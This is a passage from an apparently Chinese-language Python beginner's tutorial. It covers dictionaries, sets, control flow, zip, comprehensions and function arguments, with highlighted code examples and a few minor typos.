<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lol = [[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>],[<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>],[<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>]]</span><br><span class="line"><span class="built_in">dict</span>(lol)</span><br><span class="line"><span class="comment">#outs &#123;&#x27;c&#x27;:&#x27;d&#x27;,&#x27;a&#x27;:&#x27;b&#x27;,&#x27;e&#x27;:&#x27;f&#x27;&#125;</span></span><br></pre></td></tr></table></figure>

<p>通过对包含重复元素的列表调用<code>set()</code>函数可以让python找出去重的数据 （在集合中会详解）</p>
<ul>
<li>字典列表，列表当中套字典</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">&#x27;clolor&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;point&#x27;</span>:<span class="number">5</span>&#125;</span><br><span class="line">alien_1 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;yellow&#x27;</span>,<span class="string">&#x27;point&#x27;</span>:<span class="number">10</span>&#125;</span><br><span class="line">alien_2 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;point&#x27;</span>:<span class="number">15</span>&#125;</span><br><span class="line"></span><br><span class="line">aliens = [alien_0,alien_1,alien_2]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> alien <span class="keyword">in</span> aliens:</span><br><span class="line">    <span class="built_in">print</span>(alien) <span class="comment">#用这种方法可以输出字典，列表当中套字典</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在字典中存储列表，字典当中套列表</li>
<li>在字典中嵌套字典</li>
</ul>
<h4 id="使用-赋值或使用-copy"><a href="#使用-赋值或使用-copy" class="headerlink" title="使用=赋值或使用.copy()"></a>使用=赋值或使用<code>.copy()</code></h4><p>与列表一样，使用等于会将原数据与新数据建立联系，修改其中一个，另一个也跟着改</p>
<p>如果想要避免“一损俱损”的情况，使用<code>.copy()</code>创建一个副本</p>
<p>usage： <code>copy_dict = old_dict.copy()</code></p>
<p>以上是浅拷贝,一个修改会导致其他也修改，如果要数据互相不影响使用深度拷贝</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">new_one = copy.deepcopy()<span class="comment">#括号中可以是列表或者字典等</span></span><br></pre></td></tr></table></figure>



<h3 id="集合（set）"><a href="#集合（set）" class="headerlink" title="集合（set）"></a>集合（set）</h3><p>集合的概念和离散数学的概念重合，不再赘述，值得强调的一点是，集合中的元素不能重复且无序的</p>
<h4 id="使用set-创建集合"><a href="#使用set-创建集合" class="headerlink" title="使用set()创建集合"></a>使用<code>set()</code>创建集合</h4><p>依旧是从一个空的集合开始</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">empty_set = <span class="built_in">set</span>()</span><br><span class="line"><span class="built_in">print</span>(empty_set)</span><br><span class="line"><span class="comment">#outs: () #为什么集合不是花括号？</span></span><br><span class="line">		 <span class="comment">#仅仅是因为py中字典出现的比集合早罢了，占了集合的位置</span></span><br><span class="line"><span class="comment">#以下是非空集合</span></span><br><span class="line">even_number =&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(even_number)</span><br><span class="line"><span class="comment">#outs: &#123;0,2,4,6,8&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>set()</code>将其他类型转换为集合</li>
</ul>
<p>如前文所述，set()可以将列表转换为集合实现去重的作用（利用集合非重的特性）</p>
<ol>
<li>字符串去重</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a= <span class="string">&#x27;letter&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(a))</span><br><span class="line"><span class="comment">#outs: &#123;&#x27;l&#x27;, &#x27;t&#x27;, &#x27;r&#x27;, &#x27;e&#x27;&#125; </span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>列表元素去重</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">traffic= [<span class="string">&#x27;car&#x27;</span>,<span class="string">&#x27;bike&#x27;</span>,<span class="string">&#x27;plane&#x27;</span>,<span class="string">&#x27;plane&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(traffic))</span><br><span class="line"><span class="comment">#outs: &#123;&#x27;bike&#x27;, &#x27;car&#x27;, &#x27;plane&#x27;&#125;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>元组元素去重</li>
<li>字典建立集合只有键（key）会被使用</li>
</ol>
<h4 id="使用in测试值是否存在"><a href="#使用in测试值是否存在" class="headerlink" title="使用in测试值是否存在"></a>使用in测试值是否存在</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定义几种混合饮料，用字典表示，key是饮料名字，value是一个集合</span></span><br><span class="line">drinks = &#123;</span><br><span class="line">	<span class="string">&#x27;martini&#x27;</span>: &#123;<span class="string">&#x27;vodka&#x27;</span>, <span class="string">&#x27;vermouth&#x27;</span>&#125;, </span><br><span class="line">    <span class="string">&#x27;black russian&#x27;</span>: &#123;<span class="string">&#x27;vodka&#x27;</span>, <span class="string">&#x27;kahlua&#x27;</span>&#125;,</span><br><span class="line">	<span class="string">&#x27;white russian&#x27;</span>: &#123;<span class="string">&#x27;cream&#x27;</span>, <span class="string">&#x27;kahlua&#x27;</span>, <span class="string">&#x27;vodka&#x27;</span>&#125;, </span><br><span class="line">    <span class="string">&#x27;manhattan&#x27;</span>: &#123;<span class="string">&#x27;rye&#x27;</span>, <span class="string">&#x27;vermouth&#x27;</span>, <span class="string">&#x27;bitters&#x27;</span>&#125;, </span><br><span class="line">    <span class="string">&#x27;screwdriver&#x27;</span>: &#123;<span class="string">&#x27;orange juice&#x27;</span>, <span class="string">&#x27;vodka&#x27;</span>&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#name和contents是字典中的key-vaule</span></span><br><span class="line"><span class="keyword">for</span> name, contents <span class="keyword">in</span> drinks.items(): </span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;vodka&#x27;</span> <span class="keyword">in</span> contents: <span class="comment">#寻找有伏特加的饮料 （vodka-伏特加）</span></span><br><span class="line">        <span class="built_in">print</span>(name) <span class="comment">#for ,if语句要求强制缩进，具体会在代码结构中提及，这里理解就ok</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        outs: </span></span><br><span class="line"><span class="string">        screwdriver </span></span><br><span class="line"><span class="string">        martini</span></span><br><span class="line"><span class="string">		black russian </span></span><br><span class="line"><span class="string">		white russian</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#需要伏特加，但不要苦艾酒，不加乳糖</span></span><br><span class="line"><span class="keyword">for</span> name, contents <span class="keyword">in</span> drinks.items():</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;vodka&#x27;</span> <span class="keyword">in</span> contents <span class="keyword">and</span> <span class="keyword">not</span> (<span class="string">&#x27;vermouth&#x27;</span> <span class="keyword">in</span> contents <span class="keyword">or</span> <span class="string">&#x27;cream&#x27;</span> <span class="keyword">in</span> contents): </span><br><span class="line">    	<span class="built_in">print</span>(name)</span><br><span class="line"><span class="comment">#这段直接搬的书，加了点注释，py解释性语言的特性应该不难理解，详细的语法会在后面提及</span></span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="comment"># screwdriver </span></span><br><span class="line"><span class="comment"># black russian</span></span><br></pre></td></tr></table></figure>

<h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><ul>
<li>交集</li>
</ul>
<p>使用<code>&amp;</code>或者<code>intersection()</code>获取集合的交集</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br><span class="line">b = &#123;<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line"><span class="built_in">print</span> (a &amp; b)</span><br><span class="line"><span class="comment">#outs: &#123;2&#125;</span></span><br><span class="line"><span class="built_in">print</span>(a.intersection(b))</span><br><span class="line"><span class="comment">#outs:&#123;2&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>并集</li>
</ul>
<p>使用<code>|</code>或者<code>union()</code>获取集合的并集</p>
<ul>
<li>差集</li>
</ul>
<p>使用<code>-</code>或者<code>difference()</code>获取集合的差集</p>
<p>不常见的集合运算：</p>
<ol>
<li><p>使用<code>^</code>或者<code>symmetric_difference()</code>可以获得两个集合的异或集（仅在两个集合中出现一次）</p>
</li>
<li><p>使用 <code>&lt;= </code>或者 <code>issubset()</code> 可以判断一个集合是否是另一个集合的子集（第一个集合的所有 元素都出现在第二个集合中）</p>
</li>
<li><p><code>&lt;</code>可以表示真子集</p>
</li>
<li><p>超集与子集正好相反（第二个集合的所有元素都出现在第一个集合中），使用 <code>&gt;=</code> 或者 <code>issuperset()</code> 可以进行判断</p>
</li>
<li><p>使用 <code>&gt;</code> 可以找到一个集合的真超集（第一个集合包含第二个集合的所有元素且还包 含其他元素）</p>
</li>
</ol>
<hr>
<h2 id="py外壳（代码结构）"><a href="#py外壳（代码结构）" class="headerlink" title="py外壳（代码结构）"></a>py外壳（代码结构）</h2><p>这块内容比较简单，均是常见的结构，比如for，while，if，else，break，continue等，使用时需要注意的是py代码要求的<strong>强制缩进</strong> ，和其他一些语法规范（主要介绍和c类语言的区别）。有的时候会出现奇怪的报错提示:</p>
<p><code>unindent does not match any outer indentation level</code>这就是忘记缩进了…也是个坑，之前有笑话说写py拿着游标卡尺量还是挺真实，pycharm的自动代码格式化功能挺好用的ctrl+alt+L</p>
<h3 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h3><p>使用函数<code>input()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span> (<span class="string">&quot;please enter your name :&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;hello, &quot;</span>+ name + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>input 函数在运行过程中将输入解释为字符串而不是数字，若要数字要使用int()函数进行转换</p>
<p>int()来进行数值的输入,可以看成是str()的对应函数</p>
<ul>
<li>求模运算符 %，返回余数</li>
</ul>
<p>在py2.7中应使用函数raw_input()来提示用户输入</p>
<h3 id="if条件"><a href="#if条件" class="headerlink" title="if条件"></a>if条件</h3><p>lower()可以将函数大写变成小写但不会保存，可以用于忽略大小写的比较</p>
<p> !=      依旧表示逻辑非        and      表示逻辑与      or表示逻辑或<br> ==      依旧表示条件判断    </p>
<ul>
<li>可以利用关键字in来检查值是否已经包括在列表中</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> test:  <span class="comment">#需要加冒号</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find a&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>同样的利用not in关键字来检查特定的值是否不含在列表中</li>
</ul>
<p><strong>if条件判断，代码执行块也要缩进</strong></p>
<ul>
<li><p>if语句</p>
<ol>
<li>单if格式</li>
<li>if-elif语句</li>
<li>if-elif-else语句</li>
<li>多个elseif语句块及省略else语句 </li>
</ol>
</li>
<li><p><strong>if语句块不需要用小括号括起来</strong> ，且句末需要加上<strong>冒号</strong> </p>
</li>
<li><p>不同于c类语言，<code>5&lt;x&lt;10</code>这样的语句在py中是可行的</p>
</li>
</ul>
<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>和c系语言一样拥有break，continue等</p>
<p>与c系语言不同，py的<em>while循环</em> 和<em>for循环</em>也可以使用else语句，<strong>如果 while 循环正常结束（没有使用 break 跳出），程序将进入到可选的 else 段</strong> ，概念与if-else不同，个人理解：循环通常是为了寻找某个元素，如果找到就break了，不需要进行else继续判断；反之循环没有触发break条件则需要else即续进行判断</p>
<h3 id="for循环，使用迭代器（iterator）"><a href="#for循环，使用迭代器（iterator）" class="headerlink" title="for循环，使用迭代器（iterator）"></a>for循环，使用迭代器（iterator）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#对c类语法熟悉可能会写出如下代码</span></span><br><span class="line">numbers = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(tmp&lt;<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(numbers[tmp])</span><br><span class="line">    tmp+=<span class="number">1</span></span><br><span class="line">    <span class="comment">#outs：1 2 3 4 5 6</span></span><br><span class="line">    <span class="comment">#这代码并没有错，但是有更优解，简化代码</span></span><br><span class="line">numbers = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> numbers:</span><br><span class="line">    <span class="built_in">print</span>(number)</span><br><span class="line"><span class="comment">#将代码改成这样，使其更有py风格，提高易读性</span></span><br></pre></td></tr></table></figure>

<p>上例中的方法可以称之为迭代器，py中list，directionary,string,tuple,set均是可以迭代的对象。元组/列表在迭代的过程中产生一项，而字符串会产生一个字符，对一个字典进行迭代会返回字典的所有key（和函数<code>keys()</code>功能相同），若是对字典的value和item进行迭代可以用<code>.value()</code>,<code>.items()</code>方法，详见上文“字典转列表”小节</p>
<h4 id="使用zip-进行并行迭代"><a href="#使用zip-进行并行迭代" class="headerlink" title="使用zip()进行并行迭代"></a>使用<code>zip()</code>进行并行迭代</h4><p>并不是zip压缩的那个标准（</p>
<p>我找了半天也没找到zip这个名字怎么来的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&quot;John&quot;</span>, <span class="string">&quot;Charles&quot;</span>, <span class="string">&quot;Mike&quot;</span>)</span><br><span class="line">b = (<span class="string">&quot;Jenny&quot;</span>, <span class="string">&quot;Christy&quot;</span>, <span class="string">&quot;Monica&quot;</span>, <span class="string">&quot;Vicky&quot;</span>)</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">zip</span>(a, b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里我贴了一个w3cschool的示例代码</span></span><br><span class="line"><span class="comment">#use the tuple() function to display a readable version of the result:</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(x))</span><br><span class="line"><span class="comment">#outs：((&#x27;John&#x27;, &#x27;Jenny&#x27;), (&#x27;Charles&#x27;, &#x27;Christy&#x27;), (&#x27;Mike&#x27;, &#x27;Monica&#x27;))</span></span><br><span class="line"><span class="comment">#以长度短的为标准输出，此例中短的3个元素，就输出三个键值对。这里返回的也是一个迭代类型，实际应用中可以用dict()转换字典进行进一步处理</span></span><br></pre></td></tr></table></figure>

<p>上例中使用了<code>zip()</code>函数，通俗的理解就是将两个分开东西（支持迭代的对象，元组，列表等等）凑成了一对，并且取短输出，扯了那么多zip还没讲到并行迭代，现在回归正题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&quot;John&quot;</span>, <span class="string">&quot;Charles&quot;</span>, <span class="string">&quot;Mike&quot;</span>)</span><br><span class="line">b = (<span class="string">&quot;Jenny&quot;</span>, <span class="string">&quot;Christy&quot;</span>, <span class="string">&quot;Monica&quot;</span>, <span class="string">&quot;Vicky&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f_name,l_name <span class="keyword">in</span> <span class="built_in">zip</span>(a,b):</span><br><span class="line">    <span class="built_in">print</span>(f_name,l_name)</span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="comment">#John Jenny</span></span><br><span class="line"><span class="comment">#Charles Christy</span></span><br><span class="line"><span class="comment">#Mike Monica</span></span><br></pre></td></tr></table></figure>

<p>运用：两个列表和成一个字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">la = [<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>]</span><br><span class="line">lb = [<span class="string">&#x27;charles&#x27;</span>, <span class="string">&#x27;unknown&#x27;</span>]</span><br><span class="line">me = <span class="built_in">dict</span>(<span class="built_in">zip</span>(la,lb))</span><br></pre></td></tr></table></figure>



<h3 id="推导式（生成式）-comprehensions"><a href="#推导式（生成式）-comprehensions" class="headerlink" title="推导式（生成式）(comprehensions)"></a>推导式（生成式）(comprehensions)</h3><ul>
<li>列表推导式</li>
</ul>
<p>usage:<code>[expression for item in iterable if condition]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_list = [number <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>) <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(a_list)</span><br><span class="line"><span class="comment">#outs: [1, 3, 5]</span></span><br></pre></td></tr></table></figure>

<p>第一个 number 变量为列表生成值，也就是说，把循环、判断的结果放在列表 a_list 中。第二个 number 为循环变量,在循环的时候执行if判断语句，只把奇数存入第一个number（列表生成值）</p>
<ul>
<li>字典推导式</li>
</ul>
<p>usage:<code>&#123;key:value for key,value in iterable if condition&#125;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dictionary = &#123;<span class="string">&#x27;customer1&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;customer2&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;customer3&#x27;</span>: <span class="number">11</span>&#125;</span><br><span class="line">my_results = &#123;key : value <span class="keyword">for</span> key, value <span class="keyword">in</span> my_dictionary.items() <span class="keyword">if</span> value &gt; <span class="number">10</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(my_results)</span><br><span class="line"><span class="comment">#outs: &#123;&#x27;customer3&#x27;: 11&#125;</span></span><br></pre></td></tr></table></figure>

<p>类似列表推导式</p>
<ul>
<li>集合推导式</li>
</ul>
<p>usage:<code>&#123;expression for item in iterable if condition&#125;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_set = &#123;number <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>) <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">1</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a_set)</span><br><span class="line"><span class="comment">#outs: &#123;1, 3, 5&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>()</span></span><br><span class="line"><span class="function">	&quot;&quot;&quot;显示简单的问候语&quot;&quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">print</span>(<span class="params"><span class="string">&quot;hello!&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="title">func</span>()</span></span><br></pre></td></tr></table></figure>

<h4 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h4><ul>
<li>位置实参</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pet</span>(<span class="params">animal_type ,pet_name</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n I have a &quot;</span>+animal_type)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;My&quot;</span>+animal_type+<span class="string">&quot;&#x27;s name is &quot;</span>+pet_name.title())</span><br><span class="line">    </span><br><span class="line">pet (<span class="string">&#x27;hamster&#x27;</span>,<span class="string">&#x27;harry&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>关键词实参</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pet</span>(<span class="params">animal_type,pet_name</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n I have a &quot;</span>+animal_type)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;My&quot;</span>+animal_type+<span class="string">&quot;&#x27;s name is &quot;</span>+pet_name.title())</span><br><span class="line">pet(animal_type = <span class="string">&#x27;hamster&#x27;</span>,pet_name=<span class="string">&#x27;harry&#x27;</span>)<span class="comment">#此时可以随意调换位置</span></span><br></pre></td></tr></table></figure>

<ul>
<li>可以形参设定默认值，<code>animal_type=&#39;dog&#39;</code>使用默认值时必须先列出没有默认值的形参，再列出有默认值的实参</li>
</ul>
<h4 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_formatted_name</span>(<span class="params">fitst_name,last_name</span>):</span></span><br><span class="line">    full_name = first_name +<span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;harry&#x27;</span>,<span class="string">&#x27;smith&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure>

<ul>
<li>让实参变成可选的</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_formatted_name</span> (<span class="params">first_name,last_name,middle_name=<span class="string">&#x27;&#x27;</span></span>):</span><span class="comment">#有默认值的实参放在最后</span></span><br><span class="line">    <span class="keyword">if</span> middle_name:</span><br><span class="line">        full_name = first_name+<span class="string">&#x27; &#x27;</span>+middle_name+<span class="string">&#x27; &#x27;</span>+last_name</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">        full_name = first_name+<span class="string">&#x27; &#x27;</span>+last_name</span><br><span class="line">     <span class="keyword">return</span> full_name.title()</span><br><span class="line"><span class="comment">#没有中间名情况</span></span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;harry&#x27;</span>,<span class="string">&#x27;smith&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br><span class="line"><span class="comment">#有中间名情况</span></span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;harry&#x27;</span>,<span class="string">&#x27;hamster&#x27;</span>,<span class="string">&#x27;smith&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure>

<ul>
<li>函数可以返回任何类型的值，包括字典，列表</li>
<li>在函数中传递列表</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet_users</span>(<span class="params">names</span>):</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        msg = <span class="string">&quot;Hello,&quot;</span>+name.title()+<span class="string">&quot;!&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">        </span><br><span class="line">usernames = [<span class="string">&#x27;hannah&#x27;</span>,<span class="string">&#x27;ty&#x27;</span>,<span class="string">&#x27;margot&#x27;</span>]</span><br><span class="line">greet_users(usernames)</span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="comment"># Hello,Hannah!</span></span><br><span class="line"><span class="comment"># Hello,Ty!</span></span><br><span class="line"><span class="comment"># Hello,Margot!</span></span><br></pre></td></tr></table></figure>

<p><strong>禁止函数修改列表，在函数中传入列表时用切片表示法<code>[:]</code>可以表示仅复制不改变原列表的值</strong></p>
<h4 id="传递任意数量的实参"><a href="#传递任意数量的实参" class="headerlink" title="传递任意数量的实参"></a>传递任意数量的实参</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pizza</span>(<span class="params">*toppings</span>):</span><span class="comment">#*用于建立一个空的元组toppings</span></span><br><span class="line">    <span class="built_in">print</span>(toppings)</span><br><span class="line"> </span><br><span class="line">make_pizza(<span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">make_pizza(<span class="string">&#x27;mushrooms&#x27;</span>,<span class="string">&#x27;green peppers&#x27;</span>,<span class="string">&#x27;extra cheese&#x27;</span>)</span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="comment">#(&#x27;pepperoni&#x27;,)  #这里多一个逗号的原因不是编译器坏了，当元组元素为1时会多加一个逗号，而两个以上就可以省略</span></span><br><span class="line"><span class="comment">#(&#x27;mushrooms&#x27;, &#x27;green peppers&#x27;, &#x27;extra cheese&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>形参名*toppings创建了一个名为toppings的空元组，并将收到的值全部封装到找个元组中，以此实现任意数量的实参</p>
<h4 id="使用任意数量的关键字实参"><a href="#使用任意数量的关键字实参" class="headerlink" title="使用任意数量的关键字实参"></a>使用任意数量的关键字实参</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_profile</span> (<span class="params">first,last,**user_info</span>):</span><span class="comment">#**用于建立一个空的字典user_info</span></span><br><span class="line">	profile = &#123;&#125; <span class="comment">#空字典</span></span><br><span class="line">    profile[<span class="string">&#x27;first_name&#x27;</span>] = first</span><br><span class="line">    profile[<span class="string">&#x27;last_name&#x27;</span>] = last</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> user_info.items():<span class="comment">#item将key和value取出</span></span><br><span class="line">    	profile[key] = value</span><br><span class="line">    <span class="keyword">return</span> profile</span><br><span class="line"></span><br><span class="line">user_profile = build_profile(<span class="string">&#x27;albert&#x27;</span>,<span class="string">&#x27;einstein&#x27;</span>,location=<span class="string">&#x27;princeton&#x27;</span>,field=<span class="string">&#x27;physics&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(user_profile)</span><br></pre></td></tr></table></figure>

<h4 id="文档注释（文档字符串）"><a href="#文档注释（文档字符串）" class="headerlink" title="文档注释（文档字符串）"></a>文档注释（文档字符串）</h4><p>原文翻译中译名是文档字符串，我觉得文档注释更容易理解，就像github上一个项目的readme，在py中文档注释用来描述函数的功能，增加代码的可读性，可以用help()，或者<code>func_name.__doc__</code></p>
<p>例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_name</span>(<span class="params">*name</span>):</span></span><br><span class="line">    <span class="string">&#x27;it can print name&#x27;</span> <span class="comment">#这个就是文档注释</span></span><br><span class="line">    <span class="built_in">print</span>(name)			<span class="comment">#同样可以用多行注释来写文档注释，有书说py注释没有多行注释，多行注释就是文档注释</span></span><br><span class="line"></span><br><span class="line">print_name(<span class="string">&#x27;harry&#x27;</span>, <span class="string">&#x27;atuoa&#x27;</span>)</span><br><span class="line"><span class="comment">#outs：(&#x27;harry&#x27;, &#x27;atuoa&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span>(print_name) <span class="comment"># help(函数名)来获取该函数的具体功能</span></span><br><span class="line"><span class="comment">#outs：Help on function print_name in module __main__:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#print_name(*name)</span></span><br><span class="line"><span class="comment">#   it can print name</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(print_name.__doc__) <span class="comment">#使用__doc__来直接获取文档注释</span></span><br><span class="line"><span class="comment">#outs: it can print name</span></span><br></pre></td></tr></table></figure>

<p>上例中那个奇奇怪怪的<code>__doc__</code>其实是py的保留用法，本质是也是一个变量，不允许用户自己定义这种名字的变量，通常会除了上例中的用法，还有获取该函数名字的用法<code>func_name.__name__</code></p>
<h4 id="内部函数、闭包、匿名函数lambda"><a href="#内部函数、闭包、匿名函数lambda" class="headerlink" title="内部函数、闭包、匿名函数lambda()"></a>内部函数、闭包、匿名函数<code>lambda()</code></h4><ul>
<li>这部分内容有点绕，容易混淆，如果你们课程不要求，可以跳过</li>
</ul>
<p>函数的“优先级”可以说是之前提到过的任何py数据结构都不能比拟的，可以将函数的返回值赋值给变量，作为参数被其他函数调用，从其他函数中返回值</p>
<h5 id="内部函数"><a href="#内部函数" class="headerlink" title="内部函数"></a>内部函数</h5><p>内部函数故名思意，就是在内部的函数，在什么内部的函数呢？函数。即在函数内部的函数，函数套娃（</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">c, d</span>):</span></span><br><span class="line">        <span class="keyword">return</span> c + d</span><br><span class="line">    <span class="keyword">return</span> inner(a, b)</span><br><span class="line"></span><br><span class="line">result = outer(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># outs: 8</span></span><br></pre></td></tr></table></figure>

<p>内部函数和后面的闭包的区别就在于，内部函数获取数据是通过外部函数传参实现的。</p>
